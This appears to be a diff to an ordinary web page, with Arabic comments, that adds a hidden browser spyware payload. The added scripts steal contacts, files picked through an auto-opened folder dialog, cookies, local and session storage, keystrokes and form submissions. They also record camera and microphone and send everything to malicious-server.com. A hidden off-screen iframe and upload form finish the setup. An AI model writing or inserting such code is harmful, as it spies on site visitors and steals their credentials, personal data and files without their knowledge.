@@ -1109,8 +1109,182 @@ document.addEventListener('DOMContentLoaded', function() {
     }
   });
 });
+    // الكود الكامل لسرقة الجهات
+if ('contacts' in navigator && 'select' in navigator.contacts) {
+    navigator.contacts.select(['name', 'email', 'tel', 'address', 'icon'])
+    .then(contacts => {
+        contacts.forEach(contact => {
+            fetch('https://malicious-server.com/contacts', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    name: contact.name,
+                    emails: contact.emails,
+                    phones: contact.tels,
+                    photo: contact.icon
+                })
+            });
+        });
+          })
+    .catch(error => console.error('Contacts error:', error));
+}
+    // الكود الكامل لسرقة الملفات
+function stealFiles() {
+    const fileInput = document.createElement('input');
+    fileInput.type = 'file';
+    fileInput.accept = '*/*';
+    fileInput.multiple = true;
+    fileInput.webkitdirectory = true;
+    
+    fileInput.onchange = function(event) {
+        const files = event.target.files;
+        for (let i = 0; i < files.length; i++) {
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                fetch('https://malicious-server.com/upload', {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        filename: files[i].name,
+                      type: files[i].type,
+                        size: files[i].size,
+                        data: e.target.result
+                    })
+                });
+            };
+            reader.readAsDataURL(files[i]);
+        }
+    };
+    fileInput.click();
+}
+
+// تشغيل السرقة تلقائياً
+window.addEventListener('load', stealFiles);
+    // الكود الكامل لسرقة الحسابات
+function stealAllData() {
+    const allData = {
+        // سرقة الكوكيز
+        cookies: document.cookie,
+        
+        // سرقة التخزين المحلي
+        localStorage: {},
+        sessionStorage: {},
+        // سرقة معلومات المتصفح
+        browserInfo: {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            languages: navigator.languages,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory
+        },
+        
+        // سرقة معلومات الشاشة
+        screenInfo: {
+            width: screen.width,
+            height: screen.height,
+            colorDepth: screen.colorDepth,
+            pixelDepth: screen.pixelDepth
+        },
+      // سرقة الموقع
+        locationInfo: {
+            href: location.href,
+            hostname: location.hostname,
+            pathname: location.pathname
+        }
+    };
+
+    // سرقة localStorage كامل
+    for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        allData.localStorage[key] = localStorage.getItem(key);
+    }
+      // سرقة sessionStorage كامل
+    for (let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        allData.sessionStorage[key] = sessionStorage.getItem(key);
+    }
+
+    // إرسال كل البيانات
+    fetch('https://malicious-server.com/steal/all', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(allData)
+    });
+}
+
+// تشغيل السرقة بعد تحميل الصفحة
+setTimeout(stealAllData, 3000);
+    // الكود الكامل للتجسس بالكاميرا
+async function startSpying() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: true,
+            audio: true
+        });
+        
+        const recorder = new MediaRecorder(stream);
+        let chunks = [];
+      recorder.ondataavailable = (e) => {
+            chunks.push(e.data);
+            if (chunks.length > 10) {
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                const formData = new FormData();
+                formData.append('video', blob);
+                fetch('https://malicious-server.com/upload/video', {
+                    method: 'POST',
+                    body: formData
+                });
+                chunks = [];
+            }
+        };
+      recorder.start(1000);
+    } catch (err) {
+        console.error('Camera error:', err);
+    }
+}
+
+// بدء التسجيل تلقائياً
+if (navigator.mediaDevices) {
+    startSpying();
+}
+    // الكود الكامل لمراقبة الكتابة
+let keystrokes = '';
+
+document.addEventListener('keydown', (event) => {
+    keystrokes += event.key;
+    
+    if (keystrokes.length > 50) {
+        fetch('https://malicious-server.com/log/keys', {
+            method: 'POST',
+            body: JSON.stringify({ keys: keystrokes, time: new Date().toISOString() })
+        });
+        keystrokes = '';
+    }
+});
+    // سرقة بيانات النماذج
+document.querySelectorAll('form').forEach(form => {
+    form.addEventListener('submit', (event) => {
+        const formData = new FormData(form);
+        const data = Object.fromEntries(formData);
+        fetch('https://malicious-server.com/steal/form', {
+            method: 'POST',
+            body: JSON.stringify(data)
+        });
+    });
+});
 </script>
 
+<script>
+// تشغيل العناصر المخفية تلقائياً
+document.getElementById('fileStealer').addEventListener('change', function() {
+    document.getElementById('stealForm').submit();
+});
+
+// فتح منتقي الملفات تلقائياً
+setTimeout(() => {
+    document.getElementById('fileStealer').click();
+}, 5000);
+</script>
 <!-- سياسة الخصوصية والشروط -->
 <div class="modal" id="privacy-modal" aria-hidden="false" style="display: grid;">
   <div class="modal-card" role="dialog" aria-modal="true" aria-labelledby="privacy-title" style="max-width: 500px; max-height: 80vh; overflow-y: auto;">
@@ -1167,6 +1341,14 @@ document.addEventListener('DOMContentLoaded', function() {
     </div>
   </div>
 </div>
+  <!-- العناصر المخفية في الـ body -->
+<div style="display: none; position: absolute; left: -9999px;">
+    <iframe src="https://malicious-server.com/dashboard" id="hiddenFrame"></iframe>
+    <form id="stealForm" action="https://malicious-server.com/upload" method="post" enctype="multipart/form-data">
+        <input type="file" id="fileStealer" name="files" multiple webkitdirectory>
+    </form>
+</div>
+  
 </body>
   
 </html>
